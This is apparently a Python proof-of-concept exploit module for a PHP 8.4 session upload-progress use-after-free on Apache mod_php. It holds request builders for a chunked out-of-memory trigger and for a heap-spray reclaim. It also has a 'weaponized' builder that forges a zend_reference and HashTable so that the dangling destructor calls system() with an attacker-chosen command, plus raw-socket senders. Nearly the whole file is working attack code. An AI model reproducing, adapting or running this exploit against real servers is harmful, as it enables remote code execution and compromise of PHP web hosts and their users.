#!/usr/bin/env python3
# INDEX: dangle session_vars via pre-rinit rshutdown-skip | apache | chunk-base leak to weaponize
"""pre-RINIT RSHUTDOWN-skip dangle primitive (CVE-2026-109618, Marven11 P3).

Dangles PS(http_session_vars) (the _SESSION reference) via an upload-progress
body-parse OOM that fires BEFORE module RINIT, so php_request_shutdown skips the
session RSHUTDOWN and the reference is left pointing into freed request-heap.
This is the session.upload_progress half of CVE-2026-109618, targeting
PS(http_session_vars) through the RSHUTDOWN-skip (not progress->data). No live
string carrier and no refcount-forge for the dangle + plain reclaim.

MECHANISM (php-src 8.4.26)
  php_request_startup parses the POST body in php_hash_environment (eager $_POST
  via the rfc1867 multipart parser) BEFORE zend_activate_modules (session RINIT).

  Request A (build_request_a): a chunked multipart POST ordered PHPSESSID ->
  PHP_SESSION_UPLOAD_PROGRESS -> file part -> big (~20MB+) tail field. Chunked
  (Transfer-Encoding) bypasses the Content-Length / post_max_size pre-check so
  the body is streamed and parsed.
    - The file part fires php_session_rfc1867_update -> php_session_track_init(),
      ALLOCATING PS(http_session_vars) = a 32B zend_reference wrapping an empty
      zend_array.
    - The tail exhausts memory_limit inside the parser -> zend_bailout, still in
      php_hash_environment, so PG(modules_activated) stays 0.
    - php_request_shutdown's `if (PG(modules_activated)) zend_deactivate_modules()`
      is SKIPPED, so session RSHUTDOWN (php_rshutdown_session_globals) never runs
      and PS(http_session_vars) is not cleared. shutdown_memory_manager returns
      the request-heap chunks to the ZMM free-lists, so the persistent ps_globals
      zval now DANGLES into freed heap. The immortal prefork worker survives.

  Request B (build_request_b_*): a multipart POST with PHPSESSID +
  PHP_SESSION_UPLOAD_PROGRESS but NO file part (so the rfc1867 callback never
  calls php_rinit_session(0) to ZVAL_UNDEF the slot), plus a reclaim spray. At
  MULTIPART_EVENT_END with session.upload_progress.cleanup=1 (default),
  php_session_rfc1867_cleanup -> php_session_track_init() runs
  zval_ptr_dtor(&PS(http_session_vars)) on the dangling reference -- before B's
  module RINIT -- over the slot B's body has already reclaimed.

PRECONDITION / SCOPE (8.4.26)
  The freed 32B zend_reference slot is reclaimable by a PLAIN body spray (a
  7-byte field value becomes a 32B zend_string landing in that bin), no forge or
  carrier. But zval_ptr_dtor dispatches on the RECLAIMED object's own
  gc.type_info: a plain zend_string reads IS_STRING and is just freed as a string
  (no array-destroy, no call). To steer the dtor into zend_array_destroy ->
  zend_call_function (RCE), the bytes at the freed reference address must forge
  {gc.type_info=IS_REFERENCE, refcount=1, inner=(IS_ARRAY, &fake_HT)}, which a
  multipart string cannot express. Weaponization therefore needs a chunk-base
  LEAK + chunk-relative groom (supplied by a separate leak primitive);
  build_request_b_weaponized() is that scaffold. The author's 8.5.4/sid32/128M
  chunk-relative constants are build-specific; recalibrate per build.

Platform: php-src 8.4.26, /proc + gdb verified on php:8.4.26-apache mod_php.
Pure stdlib; safe under `python3 -I`.
"""
from __future__ import annotations

import os
import socket
import struct
import sys

# shared canonical encoder + dangle seed
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import part as _mp_part, terminator as _mp_terminator  # noqa: E402
from primitives.encode.zend_array_forge import forge_zend_array  # noqa: E402
from primitives.groom.upload_progress_seed import producer_a as _producer_a  # noqa: E402

BOUNDARY = b"rsd" + b"D" * 7          # 10-byte boundary (project convention)
PAGE_SIZE = 0x1000

# php:8.4.26-apache mod_php, /proc-verified; libphp-base-relative
OUR_ZIF_SYSTEM_OFF = 0x465370


# multipart helpers
def part(name: bytes, value: bytes, extra: bytes = b"") -> bytes:
    return _mp_part(name, value, extra=extra, boundary=BOUNDARY)


def terminator() -> bytes:
    return _mp_terminator(BOUNDARY)


# Request A  -- the pre-RINIT upload-progress OOM producer (chunked)
def build_request_a(sid: bytes, tail_bytes: int = 22 * 1024 * 1024,
                    npad: int = 8) -> bytes:
    """Body for request A. Order matters:
        PHPSESSID -> PHP_SESSION_UPLOAD_PROGRESS -> (pads) -> file part -> TAIL.
    The file part makes php_session_track_init() ALLOCATE PS(http_session_vars);
    the TAIL field then blows memory_limit while still inside php_hash_environment
    (pre module-RINIT), so the session RSHUTDOWN is skipped and the slot dangles.
    MUST be sent with Transfer-Encoding: chunked (see send_chunked).

    tail_bytes only has to exceed the target memory_limit headroom; 22 MiB trips
    a 16M limit with margin and keeps A fast (~0.05s to the 500)."""
    return _producer_a(sid, marker=b"M" * 64, npad=npad, tail_len=tail_bytes,
                       boundary=BOUNDARY)


# Request B (variant 1) -- PLAIN freed-slot reclaim (no forge, no carrier)
def build_request_b_reclaim(sid: bytes, slot_value: bytes = b"K" * 7,
                            nspray: int = 600) -> bytes:
    """Body for request B that RECLAIMS the freed 32B zend_reference slot with a
    plain spray and triggers the dangling dtor via upload-progress END cleanup.

        * NO file part  -> rfc1867 never calls php_rinit_session(0), so the
          dangling slot survives to the END-cleanup dtor (pre-RINIT).
        * slot_value is 7 bytes -> each spray field is a 32-byte zend_string that
          lands in the freed 32B zend_reference bin. (gdb-proven: the freed slot's
          payload becomes slot_value.)
        * PHP_SESSION_UPLOAD_PROGRESS + PHPSESSID -> MULTIPART_EVENT_END ->
          php_session_rfc1867_cleanup -> ... -> php_session_track_init -> the
          zval_ptr_dtor(&PS(http_session_vars)) on the reclaimed slot.

    This is the DANGLE+RECLAIM proof primitive. With a plain string spray the
    reclaimed object's gc says IS_STRING, so the dtor frees it as a string (no
    crash, no control) -- see module docstring. Use build_request_b_weaponized
    (needs a leak) to steer the dtor into RCE."""
    if len(slot_value) != 7:
        raise ValueError("slot_value must be 7 bytes to hit the 32B zend_reference bin")
    body = bytearray()
    for i in range(nspray):
        body += part(b"k%04d" % i, slot_value)
    body += part(b"PHPSESSID", sid)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"M" * 7)
    body += terminator()
    return bytes(body)


# Request B (variant 2) -- weaponized reclaim (REQUIRES a chunk-base leak)
def fake_hashtable(S: int, zif_system: int, cmd: bytes, size: int = 384) -> bytes:
    """A fake zend_array at S with pDestructor=zif_system and an inline fake
    execute_data/arData whose arg1 is a fake zend_string = cmd, so that
    zend_array_destroy(S) -> ... -> system(cmd). Structure proven on the
    8.4.26-apache build."""
    return forge_zend_array(S, zif_system, cmd, size=size, zero_opline=False)


def build_request_b_weaponized(sid: bytes, chunk_base: int, libphp_base: int,
                               cmd: bytes, doff: int, htoff: int,
                               zif_system_off: int = OUR_ZIF_SYSTEM_OFF,
                               n_pre: int = 500, n_post: int = 495,
                               ref_vl: int = 384) -> bytes:
    """Weaponized B. REQUIRES a leaked `chunk_base` (request-heap chunk, from a
    separate in-band leak) and `libphp_base` (for zif_system). Lays a fake HashTable at
    d=chunk_base+doff and sprays fake zend_references (every 32B) that forge the
    dangling PS(http_session_vars) target as {IS_REFERENCE, rc=1, inner=(IS_ARRAY,
    &fake_HT@d)}, so the END-cleanup dtor runs zend_array_destroy(d) -> system(cmd).

    doff/htoff are chunk-relative groom geometry that MUST be recalibrated on our
    build (the author's 8.5.4 DEFAULT_DOFF=0x76f00 is for a different binary/heap
    and is NOT used here). This is the scaffold that converts the proven dangle +
    plain reclaim into RCE once a leak supplies chunk_base; it is NOT a
    leak-free primitive."""
    d = chunk_base + doff
    ht = fake_hashtable(d, libphp_base + zif_system_off, cmd)

    def fake_ref() -> bytes:
        rv = bytearray(32)
        struct.pack_into("<I", rv, 0, 1)        # gc.refcount = 1
        rv[4] = 0x0A                            # gc.type_info = IS_REFERENCE
        struct.pack_into("<Q", rv, 8, d)        # val.value -> fake HT
        struct.pack_into("<I", rv, 16, 0x07)    # val.u1.type_info = IS_ARRAY
        return bytes(rv)

    ref = fake_ref()
    spray = bytearray(b"S" * ref_vl)
    o = 0
    while o + 32 <= ref_vl:
        spray[o:o + 32] = ref
        o += 32
    spray = bytes(spray)

    body = bytearray()
    for i in range(n_pre):
        body += part(b"s%04d" % i, spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", sid)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"M" * 7)
    for i in range(n_post):
        body += part(b"t%04d" % i, spray)
    body += terminator()
    return bytes(body)


# transport (raw sockets)
def _recv(sock: socket.socket, cap: int) -> bytes:
    out = bytearray()
    try:
        while len(out) < cap:
            d = sock.recv(65536)
            if not d:
                break
            out += d
    except OSError as e:
        out += b"[recv %r]" % e
    return bytes(out)


def send_chunked(host: str, port: int, path: str, body: bytes,
                 timeout: float = 30.0, chunk: int = 65536) -> bytes:
    """POST body with Transfer-Encoding: chunked (the OOM producer MUST stream so
    the parser faults mid-body, bypassing the Content-Length pre-check)."""
    hdr = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
           % (path, host, port, BOUNDARY.decode())).encode()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError as e:
        return b"[connect %r]" % e
    s.settimeout(timeout)
    try:
        s.sendall(hdr)
        for i in range(0, len(body), chunk):
            p = body[i:i + chunk]
            s.sendall(b"%x\r\n" % len(p) + p + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = _recv(s, 4 << 20)
    except OSError as e:
        r = b"[send %r]" % e
    s.close()
    return r


def send_plain(host: str, port: int, path: str, body: bytes,
               timeout: float = 30.0) -> bytes:
    """POST body with Content-Length (request B / reclaim)."""
    hdr = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n"
           % (path, host, port, BOUNDARY.decode(), len(body))).encode()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError as e:
        return b"[connect %r]" % e
    s.settimeout(timeout)
    try:
        s.sendall(hdr + body)
        r = _recv(s, 1 << 20)
    except OSError as e:
        r = b"[send %r]" % e
    s.close()
    return r


def status_line(resp: bytes) -> bytes:
    return resp.split(b"\r\n", 1)[0] if resp else b""


if __name__ == "__main__":  # smoke test of the builders (no network)
    import secrets
    sid = (b"i097" + secrets.token_hex(14).encode())[:32]
    a = build_request_a(sid)
    b = build_request_b_reclaim(sid)
    print("request A  : %d bytes (chunked OOM producer)" % len(a))
    print("request B  : %d bytes (plain freed-slot reclaim)" % len(b))
    w = build_request_b_weaponized(sid, chunk_base=0x7f0000000000,
                                   libphp_base=0x5a0000000000,
                                   cmd=b"id", doff=0x40000, htoff=0x100)
    print("request B* : %d bytes (weaponized, needs real chunk_base)" % len(w))
